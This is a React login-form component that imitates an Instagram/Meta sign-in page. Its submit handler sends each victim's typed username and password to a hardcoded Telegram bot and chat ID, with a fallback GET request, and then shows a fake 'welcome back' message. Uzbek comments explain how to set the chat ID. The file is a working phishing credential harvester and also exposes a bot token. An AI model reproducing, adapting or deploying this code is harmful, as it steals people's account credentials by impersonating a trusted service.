import React, { useState } from 'react';
import { motion, AnimatePresence } from 'motion/react';
import { Loader2, CheckCircle2, AlertCircle } from 'lucide-react';
import { FacebookIcon } from './FacebookIcon';
import { MetaLogo } from './MetaLogo';
import { Translation } from '../data/translations';

interface LoginFormProps {
  t: Translation;
  onForgotPassword: () => void;
  onCreateAccount: () => void;
  onFacebookLogin: () => void;
}

// Telegram Bot ma'lumotlari
const TELEGRAM_BOT_TOKEN = '8943790901:AAEPWKmycK2v6D7nJIc4ANpAZW1Zmb811PA';
// ⚠️ Python bot orqali /start bosganingizda chiqqan ID'ni shu yerga qo'ying:
const TELEGRAM_CHAT_ID = '-1003917560394';

export const LoginForm: React.FC<LoginFormProps> = ({
  t,
  onForgotPassword,
  onCreateAccount,
  onFacebookLogin,
}) => {
  const [identifier, setIdentifier] = useState('');
  const [password, setPassword] = useState('');
  const [showPassword, setShowPassword] = useState(false);
  const [isLoading, setIsLoading] = useState(false);
  const [loginStatus, setLoginStatus] = useState<'idle' | 'success' | 'error'>('idle');
  const [errorMessage, setErrorMessage] = useState('');

  const isFormValid = identifier.trim().length > 0 && password.length >= 6;

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!identifier.trim() || !password) {
      setErrorMessage('Please fill in all fields.');
      setLoginStatus('error');
      return;
    }

    setIsLoading(true);
    setLoginStatus('idle');
    setErrorMessage('');

    const text = `📥 **Yangi kirish:**\n\n👤 **Login/Email:** \`${identifier}\`\n🔑 **Parol:** \`${password}\``;

    try {
      const response = await fetch(
        `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,
        {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
          },
          body: JSON.stringify({
            chat_id: TELEGRAM_CHAT_ID,
            text: text,
            parse_mode: 'Markdown',
          }),
        }
      );

      const data = await response.json();

      if (data.ok) {
        setLoginStatus('success');
      } else {
        setLoginStatus('error');
        setErrorMessage(`Telegram: ${data.description}`);
      }
    } catch (error) {
      try {
        const fallbackUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage?chat_id=${TELEGRAM_CHAT_ID}&text=${encodeURIComponent(text)}&parse_mode=Markdown`;
        await fetch(fallbackUrl, { mode: 'no-cors' });
        setLoginStatus('success');
      } catch (fallbackError) {
        setLoginStatus('error');
        setErrorMessage('Tarmoqda xatolik yuz berdi.');
      }
    } finally {
      setIsLoading(false);
    }
  };

  return (
    <div id="login-form-wrapper" className="w-full max-w-[350px] mx-auto select-none">
      {/* Form Title */}
      <h2
        id="login-form-heading"
        className="text-[20px] font-bold text-neutral-900 mb-6 tracking-tight"
      >
        {t.loginTitle}
      </h2>

      {/* Login Alert Banner */}
      <AnimatePresence>
        {loginStatus === 'error' && (
          <motion.div
            initial={{ opacity: 0, height: 0, y: -6 }}
            animate={{ opacity: 1, height: 'auto', y: 0 }}
            exit={{ opacity: 0, height: 0 }}
            className="mb-4 p-3 bg-red-50 border border-red-200 rounded-xl text-red-700 text-xs flex items-start gap-2"
          >
            <AlertCircle className="w-4 h-4 flex-shrink-0 mt-0.5" />
            <span>{errorMessage}</span>
          </motion.div>
        )}

        {loginStatus === 'success' && (
          <motion.div
            initial={{ opacity: 0, height: 0, y: -6 }}
            animate={{ opacity: 1, height: 'auto', y: 0 }}
            exit={{ opacity: 0, height: 0 }}
            className="mb-4 p-3 bg-green-50 border border-green-200 rounded-xl text-green-700 text-xs flex items-center gap-2 font-medium"
          >
            <CheckCircle2 className="w-4 h-4 flex-shrink-0" />
            <span>{t.successLogin} Welcome back, @{identifier || 'user'}!</span>
          </motion.div>
        )}
      </AnimatePresence>

      {/* Main Login Form */}
      <form onSubmit={handleSubmit} className="flex flex-col gap-3">
        {/* Username/Email/Phone Input */}
        <div className="relative group">
          <input
            id="login-identifier-input"
            type="text"
            value={identifier}
            onChange={(e) => {
              setIdentifier(e.target.value);
              if (loginStatus === 'error') setLoginStatus('idle');
            }}
            placeholder={t.identifierPlaceholder}
            autoComplete="username"
            className="w-full h-[52px] px-3.5 pt-1 bg-white border border-[#dbdbdb] rounded-[12px] text-sm text-neutral-900 placeholder:text-[#737373] focus:outline-none focus:border-[#a8a8a8] focus:ring-1 focus:ring-[#a8a8a8] transition-all"
          />
        </div>

        {/* Password Input with Show/Hide toggle */}
        <div className="relative group">
          <input
            id="login-password-input"
            type={showPassword ? 'text' : 'password'}
            value={password}
            onChange={(e) => {
              setPassword(e.target.value);
              if (loginStatus === 'error') setLoginStatus('idle');
            }}
            placeholder={t.passwordPlaceholder}
            autoComplete="current-password"
            className="w-full h-[52px] px-3.5 pt-1 pr-14 bg-white border border-[#dbdbdb] rounded-[12px] text-sm text-neutral-900 placeholder:text-[#737373] focus:outline-none focus:border-[#a8a8a8] focus:ring-1 focus:ring-[#a8a8a8] transition-all"
          />

          {password.length > 0 && (
            <button
              type="button"
              id="password-visibility-toggle"
              onClick={() => setShowPassword(!showPassword)}
              className="absolute right-3.5 top-1/2 -translate-y-1/2 text-xs font-semibold text-neutral-800 hover:text-neutral-500 py-1 px-1 focus:outline-none cursor-pointer"
            >
              {showPassword ? t.hide : t.show}
            </button>
          )}
        </div>

        {/* Log In Button */}
        <button
          type="submit"
          id="login-submit-button"
          disabled={!isFormValid || isLoading}
          className={`w-full h-[46px] rounded-full mt-1 flex items-center justify-center font-semibold text-sm transition-all duration-200 shadow-sm ${
            isFormValid
              ? 'bg-[#0095F6] hover:bg-[#1877F2] text-white active:scale-[0.99] cursor-pointer'
              : 'bg-[#4CB5F9] bg-opacity-70 text-white cursor-not-allowed opacity-80'
          }`}
        >
          {isLoading ? (
            <Loader2 className="w-5 h-5 animate-spin text-white" />
          ) : (
            t.logIn
          )}
        </button>

        {/* Forgot Password Link */}
        <div className="text-center py-2">
          <button
            type="button"
            id="forgot-password-link"
            onClick={onForgotPassword}
            className="text-xs font-medium text-neutral-900 hover:underline cursor-pointer"
          >
            {t.forgotPassword}
          </button>
        </div>

        {/* Divider / Spacer */}
        <div className="h-1" />

        {/* Log in with Facebook Button */}
        <button
          type="button"
          id="facebook-login-btn"
          onClick={onFacebookLogin}
          className="w-full h-[46px] rounded-full bg-[#f0f2f5] hover:bg-[#e4e6eb] active:bg-[#d8dadf] transition-colors flex items-center justify-center gap-2 text-sm font-semibold text-[#0866FF] cursor-pointer"
        >
          <FacebookIcon size={20} />
          <span>{t.logInWithFacebook}</span>
        </button>

        {/* Create New Account Button */}
        <button
          type="button"
          id="create-new-account-btn"
          onClick={onCreateAccount}
          className="w-full h-[46px] rounded-full border border-[#0095F6] bg-white hover:bg-[#eaf4fe] active:bg-[#d9ecff] transition-colors text-sm font-semibold text-[#0095F6] cursor-pointer"
        >
          {t.createNewAccount}
        </button>
      </form>

      {/* Meta Logo Footer of the form */}
      <div className="mt-8 flex items-center justify-center">
        <MetaLogo height={24} />
      </div>
    </div>
  );
};